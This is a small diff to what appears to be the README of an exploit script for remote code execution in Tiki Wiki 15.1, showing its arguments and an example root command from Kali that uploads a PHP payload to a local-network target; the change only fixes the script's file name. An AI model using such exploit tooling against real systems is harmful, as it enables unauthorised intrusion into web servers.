@@ -18,5 +18,5 @@ Required arguments:
   -U URL, --url URL  URL of the Tiki Wiki page eg.
                      http://webserver.com/tikiwiki
   -P PHP, --php PHP  Path to php payload eg. payload.php
-root@Kali:~/# python3 tikiwiki_15.1_RCE --url 'http://192.168.92.151/tiki' --php payload.php
+root@Kali:~/# python3 tikiwiki_15.1_RCE.py --url 'http://192.168.92.151/tiki' --php payload.php
 ```
